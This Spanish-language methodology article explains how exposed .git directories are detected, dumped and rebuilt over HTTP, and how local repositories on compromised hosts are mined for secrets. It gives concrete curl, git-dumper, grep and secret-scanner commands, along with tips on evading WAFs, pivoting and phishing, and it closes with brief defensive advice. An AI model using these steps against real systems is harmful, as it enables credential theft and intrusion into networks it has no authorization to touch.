---
title: "Repertorios .git Expuestos: Extracción Antes y Después de la Explotación"
description: "Cómo los directorios .git expuestos permiten recuperar el código fuente completo, secretos en el historial y información interna. Se cubren la detección, la extracción, la reconstrucción y la extracción local post-explotación con comandos concretos."
category: "Método"
tags: [".git", "Git", "Recon", "Post-Exploitation", "Secrets", "Source Recovery"]
featured: false
date: "2026-10-05"
---

> Un directorio `.git` expuesto suele ser mucho más valioso que una única vulnerabilidad. Proporciona todo el historial de desarrollo, incluyendo errores que los desarrolladores creían haber eliminado.

## The question

¿Cómo puede aprovecharse un directorio `.git` expuesto tanto en la fase pre-explotación (reconocimiento web externo), como en la post-explotación (acceso local a una máquina comprometida), y qué técnicas y comandos concretos funcionan realmente para extraer información útil?

## The target model

Un directorio `.git` contiene metadatos de control de versiones: base de datos de objetos (blobs/trees/commits), refs (ramas/tags), HEAD, config, index, packed-refs, logs y más. Cuando un servidor web mal configurado sirve `.git/` (o cuando se encuentra localmente en hosts comprometidos), estos metadatos permiten reconstruir tanto el árbol de trabajo completo como el historial del repositorio, revelando con frecuencia archivos eliminados, secrets hardcodeados, nombres de dominio internos y detalles de despliegue.

- **Actores**: Atacante externo con acceso HTTP a la raíz web; atacante interno/post-exploiter con acceso al sistema de archivos en un host comprometido.
- **Activos**: Código fuente, commit history, diffs, stashes/reflogs, remotos en .git/config, configuraciones de CI y credentials en commits antiguos.
- **Superficie**: Servidor web mal configurado (listado de directorios o acceso directo a archivos .git/*), directorios de desarrollo olvidados, recursos compartidos internos, repositorios residuales en raíces web/rutas de CI/backups.

## The surface criteria

| Criterio | Pregunta que responde |
| --- | --- |
| **Alcanzable** | ¿Podemos acceder a `.git/HEAD`, `.git/config` u objetos? (HTTP o filesystem) |
| **Traducible** | ¿Los metadatos permiten reconstruir objetos/commits/archivos? |
| **Genera pivote** | ¿Los secrets/URLs recuperados apuntan a sistemas internos a los que podemos pivotar? |
| **Otorga autoridad** | ¿Encontramos API keys, tokens, claves privadas o credenciales que permitan acceso? |

**Priorización**: Enfóquese primero en la recuperación completa de objetos (permite reconstruir árbol completo e historial), luego en el escaneo de secrets a lo largo de todo el historial (no solo el árbol de trabajo).

## The inventory

| Elemento | Propósito | Se relaciona con | Límite de confianza | Fallo a considerar |
| --- | --- | --- | --- | --- |
| `.git/HEAD` | Apunta a la ref de la rama actual | Refs | Metadatos | Confirma el estado del repositorio, guía el recorrido de refs |
| `.git/config` | URLs remotos, ramas, configuración del repo | Hosts git internos | Auth/config | Revela remotos internos, a veces con credenciales embebidas |
| `.git/index` | Área de staging (rutas de archivos/modos/hashes) | Objetos | Índice de contenido | Permite enumerar archivos incluso si el listado está deshabilitado |
| `.git/refs/` | Punteros a commits de ramas/tags | Commits/objetos | Límite de refs | Mapea puntos de inicio del historial |
| `.git/logs/` | Reflogs (historial local de actualizaciones de refs) | Refs/commits | Historial local | Recupera ramas/commits no presentes en refs |
| `.git/packed-refs` | Refs empaquetadas para eficiencia | Commits | Almacén de refs | Fuente alternativa de refs |
| `.git/objects/` | Objetos loose (aa/bb... contenido) + packs | Todo | Object DB | Núcleo: blobs/trees/commits necesarios para reconstruir archivos |
| `.git/info/` | Metadatos del repo (exclude, etc.) | — | Local | Pistas ocasionalmente útiles |
| Stashes | Commits de WIP | Objetos | Estado local | Pueden contener información sensible en trabajo en progreso |

## From element to vector

### Scenario A: Pre-exploitation (exposed .git over HTTP)

1. **Actor**: Atacante externo con acceso web  
2. **Precondición**: `.git/` alcanzable (acceso directo a archivos o listado parcial)  
3. **Primitiva**: Descargar metadatos + objetos del repo → reconstruir código fuente completo e historial  
4. **Consecuencia**: Acceso a archivos eliminados, secrets en commits antiguos, rutas/URLs internas  
5. **Objetivo**: Credenciales filtradas → acceso; conocimiento del código → más vulnerabilidades/pivotes

### Scenario B: Post-exploitation (local .git)

1. **Actor**: Usuario/privilegiado en host comprometido  
2. **Precondición**: Se encuentran directorios `.git/` en el filesystem (raíces web, home, CI, backups)  
3. **Primitiva**: Leer historial completo, reflogs, stashes, config  
4. **Consecuencia**: Extraer credenciales, infraestructura interna, inteligencia sobre desarrolladores para movimiento lateral/phishing  
5. **Objetivo**: Ampliar acceso, inteligencia para persistencia, reutilización de credenciales

**Candidatos rechazados:**

> **Rechazado:** Scraping ciego sin validar integridad de objetos — falla en *primitiva*: dumps parciales producen árboles corruptos; validar con `git fsck`.  
> **Rechazado:** Depender únicamente del working tree tras `git checkout` — falla en *objetivo*: archivos eliminados/secrets viven en historial/diffs/stashes, no solo HEAD.  
> **Rechazado:** Fuerza bruta de hashes arbitrarios a gran escala — falla en *coste*: ineficiente vs extraer index/packed-refs/logs para enumerar hashes conocidos.

> **En pocas palabras**  
> La carpeta `.git` es un libro de registros. Si solo lees la página actual (working tree), te pierdes las líneas redactadas en páginas antiguas (historial). La ventaja está en recuperar esas páginas antiguas y escanearlas.

## Execution

### Scenario A: Pre-exploitation — Exposed .git over HTTP

#### Detection

Compruebe endpoints comunes:

```bash
curl -I https://target.tld/.git/HEAD
curl -s https://target.tld/.git/config
curl -s https://target.tld/.git/index | head -c 100
```

Indicadores: HTTP 200 para `.git/HEAD` (suele contener `ref: refs/heads/main` o `master`), config/index legibles. Si el listado de directorios está habilitado, es un indicador muy fuerte.

#### Automated dumping (recommended)

- **[git-dumper](https://github.com/arthaud/git-dumper)**: Fiable ante exposiciones `.git` parciales u ofuscadas. Descarga objetos/refs manejando particularidades del listado.
```bash
pip install git-dumper
git-dumper https://target.tld/ ./dump/
```
- **[GitTools](https://github.com/internetwache/GitTools)**: `gitdumper.sh` (descarga), `extractor.sh` (reconstruye). Útil cuando objetos son accesibles pero estructura incompleta.
```bash
./GitTools/Dumper/gitdumper.sh https://target.tld/.git/ ./dump
./GitTools/Extractor/extractor.sh ./dump ./repo
```
- **[dvcs-ripper](https://github.com/kost/dvcs-ripper)**: Extrae CVS/SVN/Git/Mercurial; útil en casos complejos.
```bash
perl rip-git.pl -v -u https://target.tld/.git/
```

#### Manual reconstruction when directory listing is disabled

Truco común: `.git/index` lista todos los archivos tracked con sus hashes SHA-1 (incluso sin listado). También `.git/packed-refs`, `.git/refs/heads/*`, `.git/refs/tags/*`, `.git/logs/HEAD` revelan hashes de commits.

Flujo de trabajo:

1. Descargue archivos críticos: `/.git/HEAD`, `/.git/index`, `/.git/config`, `/.git/packed-refs`, y cualquier ref/log alcanzable (`/.git/refs/heads/*`, `/.git/logs/HEAD`).
2. Parse `.git/index` para enumerar rutas + blob hashes (saber qué objetos deben existir).
3. Intente obtener loose objects: `.git/objects/aa/bbcc...` donde `aa` = primeros 2 chars hex, `bbcc...` = resto (40 hex total). Pruebe rutas comunes.
4. Descargue packs si existen: `.git/objects/pack/pack-*.pack` y `.idx`.
5. Reconstruya: una vez recuperados objetos+refs, ejecute `git` en el directorio dump (`git log --all`, `git branch -a`, `git checkout .`).

#### Common pitfalls

- Dumps parciales (faltan packs/objetos) → `git fsck --full` muestra dangling/unreachable; recupere vía logs/reflogs/packed-refs.
- Objetos/packs corruptos → pruebe herramientas alternativas; a veces necesario obtener hashes faltantes manualmente.
- Rate limiting o WAF bloqueando rutas .git → use cabeceras stealth, throttling o variaciones de mayúsculas/minúsculas (raro). Concéntrese en lo realmente alcanzable.

### Scenario B: Post-exploitation — Local .git repos

#### Locate repos

```bash
# Find all .git directories
find / -name ".git" -type d 2>/dev/null

# Common locations
ls -la /var/www/html/.git 2>/dev/null
ls -la /home/*/.git 2>/dev/null
ls -la /opt/*/.git /srv/*/.git /var/lib/*/.git 2>/dev/null
find / -path "*ci*\.git" -not -path "*/node_modules/*" 2>/dev/null
```

#### Extract secrets and history

```bash
cd /path/to/repo
git log --oneline -10
git log -p --max-count=5        # full diffs of recent commits
git log --all --full-history -- <sensitive-file>
git blame <file>                # who changed what
```

Busque patrones en diffs: API keys, tokens, passwords, private keys, connection strings, credenciales AWS/GCP/Azure, JWTs.

#### Recover deleted files/branches, reflogs, stashes

```bash
git reflog                     # history of HEAD movements (recovers lost commits)
git stash list                 # stashed work-in-progress
git stash show -p stash@{0}    # inspect stash diffs

# Find unreachable/dangling objects
git fsck --unreachable --no-reflogs
git fsck --lost-found

# Recover dangling blobs/commits if needed
# git show <dangling-sha>
```

#### Secret scanning tools (history-aware)

```bash
# TruffleHog (deep history scanning)
trufflehog git file:///path/to/repo --only-verified

# Gitleaks (fast regex-based)
gitleaks detect -v --source /path/to/repo

# git-secrets (pre-commit style, also scan history)
git secrets --scan-history
```

#### Review config, remotes, CI

```bash
cat .git/config
git remote -v
# Check CI/CD configs
cat .gitlab-ci.yml .github/workflows/*.yml 2>/dev/null
cat azure-pipelines.yml Jenkinsfile 2>/dev/null
```

Busque credenciales embebidas en remote URLs (`https://user:pass@internal.git/...`) o secrets referenciados en variables de CI.

## What to extract (checklist)

- **Secrets**: API keys, access tokens, passwords, private keys (SSH/SSL), service account creds
- **Infra**: Internal hostnames, IPs, domains, VPN ranges, internal git/registry URLs
- **Configs**: `.env`, config files committed then removed, DB connection strings
- **Code intel**: Auth logic, endpoints, business rules (useful for further attacks)
- **Identity**: Author emails/usernames (phishing, credential spraying correlation)
- **CI/CD**: Pipeline configs revealing deployment secrets, internal systems, build paths
- **Operational**: Backup paths, deployment scripts, test data with real info

## Practical workflow example

1. **Discover**: `curl -I http://target.example/.git/HEAD` → 200 OK, muestra `ref: refs/heads/master`
2. **Dump**: `git-dumper http://target.example/ ./dump/` → descarga objetos/refs/index/config
3. **Reconstruct**: `cd dump && git log --oneline --all -5` → ve commit history; `git branch -a`
4. **Explore**: `git checkout master 2>/dev/null; ls -la` → árbol de trabajo completo recuperado
5. **Find secrets**: `git log -p --all | grep -iE 'api[_-]?key|password|token|secret|private[_-]?key' | head -20`
6. **Dig deeper**: `gitleaks detect --source . -v` o `trufflehog git file://$(pwd)` en todo el historial
7. **Pivot**: Desde `.git/config` o diffs, extraiga hostnames/credenciales internas → valide movimiento lateral (con autorización)

## Defensive notes (brief)

- Bloquee acceso a `.git/` en servidor web (nginx `location ~ /\.git { deny all; }`, Apache `RedirectMatch 404 /\.git`, o deshabilite índice de directorios y no sirva dotdirs).
- Trate secrets como comprometidos si alguna vez fueron committeados; rote inmediatamente. Use history rewriting (BFG Repo-Cleaner) o `git filter-repo` para purgar, luego force-push con cuidado.
- Implemente `.gitignore`, pre-commit hooks (`gitleaks`, `git-secrets`, `trufflehog`), secret scanning en CI (push protection), y evite exposición directa de `.git` en todos los entornos (dev/staging/prod).
- Nunca embeba credenciales en remote URLs; use deploy keys, tokens o Git credential helpers.

## Closing

Ya sea externo o post-explotación, los artefactos `.git` son botín de bajo esfuerzo que suele generar alto valor. La metodología es consistente: verifique alcanzabilidad, recupere el grafo completo de objetos (no se detenga en HEAD), luego mine el historial (reflogs/stashes/diffs) en busca de secrets y referencias a infraestructura. Trate el commit history como parte de su superficie de recon/loot — enumérelo de forma exhaustiva y metódica.

## Glossary

- **Loose object**: Objeto git almacenado como archivo individual `objects/aa/bbbb...`
- **Packfile (.pack/.idx)**: Objetos comprimidos/deltificados para eficiencia
- **Ref**: Puntero a commit (ramas/tags/HEAD)
- **Reflog**: Log local de actualizaciones de refs (sobrevive a resets en repo local)
- **Dangling object**: Commit/blob/tree no alcanzable (puede venir de amend/rebase/refs eliminados)
- **Working tree**: Archivos actualmente extraídos
- **Index**: Área de staging; contiene hashes/rutas de archivos tracked incluso si eliminados en working tree